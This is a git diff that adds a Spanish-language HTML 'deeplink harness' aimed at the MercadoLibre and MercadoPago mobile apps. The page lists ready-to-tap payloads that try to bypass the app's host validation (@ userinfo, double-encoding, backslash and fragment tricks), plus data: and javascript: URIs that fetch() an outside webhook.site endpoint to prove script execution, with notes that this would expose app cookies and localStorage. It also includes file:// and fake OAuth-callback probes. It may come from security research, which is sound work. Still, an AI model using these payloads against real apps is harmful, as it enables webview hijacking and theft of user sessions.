@@ -1,8 +1,128 @@
 <!DOCTYPE html>
-<html><body>
-<a id="l" href="meli://webview/?url=https://www.mercadolibre.com.ar/ofertas">TAP ACÁ2</a>
-<script>
-  // opcional: auto-dispara al cargar
-  // location.href = document.getElementById('l').href;
-</script>
+<html lang="es"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>MELI deeplink harness</title>
+<style>
+  :root{color-scheme:dark}
+  body{margin:0;padding:14px 12px 60px;background:#0f1115;color:#e6e6e6;
+    font-family:ui-monospace,Menlo,Consolas,monospace;font-size:14px;line-height:1.35}
+  header{background:#1a1d24;border:1px solid #2a2e38;border-radius:10px;padding:12px;margin-bottom:16px}
+  header b{color:#ffe600}
+  h2{color:#8ab4ff;font-size:13px;text-transform:uppercase;letter-spacing:.5px;
+    margin:22px 0 8px;border-bottom:1px solid #2a2e38;padding-bottom:4px}
+  a.p{display:block;background:#181b21;border:1px solid #2a2e38;border-radius:9px;
+    padding:12px 12px;margin:8px 0;text-decoration:none;color:inherit}
+  a.p:active{background:#232833}
+  .lab{font-weight:600;color:#fff;margin-bottom:4px}
+  .tag{color:#5ee6a8;font-weight:400}
+  .note{color:#9aa1ac;font-size:12px}
+  .wh{color:#5ee6a8;word-break:break-all;font-size:11px}
+</style></head>
+<body>
+<header>
+  <b>MELI deeplink harness</b><br>
+  Webhook: <span class="wh">https://webhook.site/761e611b-2c3c-4692-94ba-c4f0216184f6</span><br><br>
+  Abrí <b>webhook.site en vivo</b> en otra pestaña. Regla: <b>solo cuenta si llega un hit de un host que NO es MELI.</b>
+  Cada payload trae su tag <span class="tag">?t=</span> — así sabés cuál pegó.
+  Los de SCHEME PROBES y OAUTH: <b>mirá la pantalla de la app</b>, no el webhook.
+  Empezá por el CONTROL (arriba de todo).
+</header>
+<h2>CONTROL</h2>
+ 
+        <a class="p" href="meli://webview/?url=https%3A%2F%2Fwww.mercadolibre.com.mx">
+          <div class="lab"><span class="tag">?t=ctrl-legit</span> webview + URL legítima MELI</div>
+          <div class="note">NO pega al webhook. Mirá la APP: ¿carga mercadolibre.com.mx? Si SÍ → el handler anda y el formato es correcto.</div>
+        </a>
+ 
+        <a class="p" href="meli://webview/?url=https%3A%2F%2Fwebhook.site%2F761e611b-2c3c-4692-94ba-c4f0216184f6%3Ft%3Dbaseline">
+          <div class="lab"><span class="tag">?t=baseline</span> webview + externo plano</div>
+          <div class="note">El que ya falló. Baseline. Si no llega hit → valida host nativo.</div>
+        </a>
+<h2>BYPASS DE HOST</h2>
+ 
+        <a class="p" href="meli://webview/?url=https%3A%2F%2Fwww.mercadolibre.com.mx%40webhook.site%2F761e611b-2c3c-4692-94ba-c4f0216184f6%3Ft%3Dat">
+          <div class="lab"><span class="tag">?t=at</span> @ trick</div>
+          <div class="note">host real = webhook.site. Si valida con contains/startsWith → bypass. EL más jugoso.</div>
+        </a>
+ 
+        <a class="p" href="meli://webview/?url=https%3A%2F%2Fwww.mercadolibre.com.mx%2540webhook.site%2F761e611b-2c3c-4692-94ba-c4f0216184f6%3Ft%3Datenc">
+          <div class="lab"><span class="tag">?t=atenc</span> @ doble-encodeado</div>
+          <div class="note">Testea si el nativo decodea dos veces antes de parsear el host.</div>
+        </a>
+ 
+        <a class="p" href="meli://webview/?url=https%3A%2F%2Fwww.mercadolibre.com.mx%3Ax%40webhook.site%2F761e611b-2c3c-4692-94ba-c4f0216184f6%3Ft%3Duserinfopass">
+          <div class="lab"><span class="tag">?t=userinfopass</span> userinfo con password</div>
+          <div class="note">user:pass@host. Otra forma de meter MELI en userinfo.</div>
+        </a>
+ 
+        <a class="p" href="meli://webview/?url=https%3A%2F%2Fwebhook.site%2F761e611b-2c3c-4692-94ba-c4f0216184f6%3Ft%3Dfrag%23%40www.mercadolibre.com.mx">
+          <div class="lab"><span class="tag">?t=frag</span> fragment confusion</div>
+          <div class="note">MELI en el #fragment. Si el validador mira la string completa y no parsea → pasa.</div>
+        </a>
+ 
+        <a class="p" href="meli://webview/?url=https%3A%2F%2Fwebhook.site%2F761e611b-2c3c-4692-94ba-c4f0216184f6%3Ft%3Dquerymark%26x%3Dwww.mercadolibre.com.mx">
+          <div class="lab"><span class="tag">?t=querymark</span> marker en query del externo</div>
+          <div class="note">MELI como param del propio webhook. Testea contains() bobo.</div>
+        </a>
+ 
+        <a class="p"
+
+href="meli://webview/?url=https%3A%2F%2Fwebhook.site%2F761e611b-2c3c-4692-94ba-c4f0216184f6%3Ft%3Dbackslash%5C%40www.mercadolibre.com.mx">
+          <div class="lab"><span class="tag">?t=backslash</span> backslash trick</div>
+          <div class="note">host real webhook.site. Parsers de Android/Java difieren con \.</div>
+        </a>
+ 
+        <a class="p" href="meli://webview/?url=https%3A%2Fwebhook.site%2F761e611b-2c3c-4692-94ba-c4f0216184f6%3Ft%3Dslashslash">
+          <div class="lab"><span class="tag">?t=slashslash</span> slash malformado</div>
+          <div class="note">https:/ con una sola barra. Algunos parsers lo normalizan igual.</div>
+        </a>
+<h2>OTROS HANDLERS</h2>
+ 
+        <a class="p" href="meli://browser?url=https%3A%2F%2Fwebhook.site%2F761e611b-2c3c-4692-94ba-c4f0216184f6%3Ft%3Dbrowser">
+          <div class="lab"><span class="tag">?t=browser</span> handler browser</div>
+          <div class="note">otro handler que recibe url externa.</div>
+        </a>
+ 
+        <a class="p" href="mercadopago://webview/?url=https%3A%2F%2Fwebhook.site%2F761e611b-2c3c-4692-94ba-c4f0216184f6%3Ft%3Dmpwebview">
+          <div class="lab"><span class="tag">?t=mpwebview</span> mercadopago webview</div>
+          <div class="note">el mismo webview pero por scheme mercadopago://</div>
+        </a>
+ 
+        <a class="p" href="meli://webview?url=https%3A%2F%2Fwebhook.site%2F761e611b-2c3c-4692-94ba-c4f0216184f6%3Ft%3Dnoslash">
+          <div class="lab"><span class="tag">?t=noslash</span> webview sin slash</div>
+          <div class="note">meli://webview?... sin la barra. Cambia el routing en algunos parsers.</div>
+        </a>
+ 
+        <a class="p" href="meli://cross-link?deeplink=meli%3A%2F%2Fbrowser%3Furl%3Dhttps%253A%252F%252Fwebhook.site%252F761e611b-2c3c-4692-94ba-c4f0216184f6%253Ft%253Dcrosslink">
+          <div class="lab"><span class="tag">?t=crosslink</span> cross-link anidado</div>
+          <div class="note">cross-link envolviendo un browser handler. Testea si desanida y ejecuta.</div>
+        </a>
+<h2>SCHEME PROBES</h2>
+ 
+        <a class="p" href="meli://webview/?url=data%3Atext%2Fhtml%2C%3Ch1%3EMELI_DATA_TEST%3C%2Fh1%3E">
+          <div class="lab"><span class="tag">?t=data</span> data: URI en webview</div>
+          <div class="note">MIRÁ LA APP: si renderiza el <h1> → el webview acepta data: → superficie de XSS.</div>
+        </a>
+ 
+        <a class="p" href="meli://webview/?url=data%3Atext%2Fhtml%2C%3Cscript%3Efetch%28%22https%3A%2F%2Fwebhook.site%2F761e611b-2c3c-4692-94ba-c4f0216184f6%3Ft%3Ddatajs%22%29%3C%2Fscript%3E">
+          <div class="lab"><span class="tag">?t=datajs</span> data: con JS que llama al webhook</div>
+          <div class="note">Si el webhook recibe hit ?t=datajs → EL WEBVIEW EJECUTA JS ARBITRARIO. Escala fuerte (cookies/localStorage de la app).</div>
+        </a>
+ 
+        <a class="p" href="meli://webview/?url=javascript%3Afetch%28%22https%3A%2F%2Fwebhook.site%2F761e611b-2c3c-4692-94ba-c4f0216184f6%3Ft%3Djsscheme%22%29">
+          <div class="lab"><span class="tag">?t=jsscheme</span> javascript: scheme</div>
+          <div class="note">Si llega ?t=jsscheme → ejecución en contexto webview.</div>
+        </a>
+ 
+        <a class="p" href="meli://webview/?url=file%3A%2F%2F%2Fandroid_asset%2F">
+          <div class="lab"><span class="tag">?t=file</span> file:// local</div>
+          <div class="note">MIRÁ LA APP: ¿muestra contenido de archivo local? → lectura de archivos en el webview.</div>
+        </a>
+<h2>OAUTH (observar app)</h2>
+ 
+        <a class="p" href="meli://oauth/callback?code=INERT_TEST&state=INERT_TEST">
+          <div class="lab"><span class="tag">?t=oauth</span> oauth/callback con code falso</div>
+          <div class="note">NO pega al webhook. Mirá la APP: ¿intenta loguear? ¿tira 'code inválido'? ¿cambia de cuenta? Solo observación.</div>
+        </a>
 </body></html>
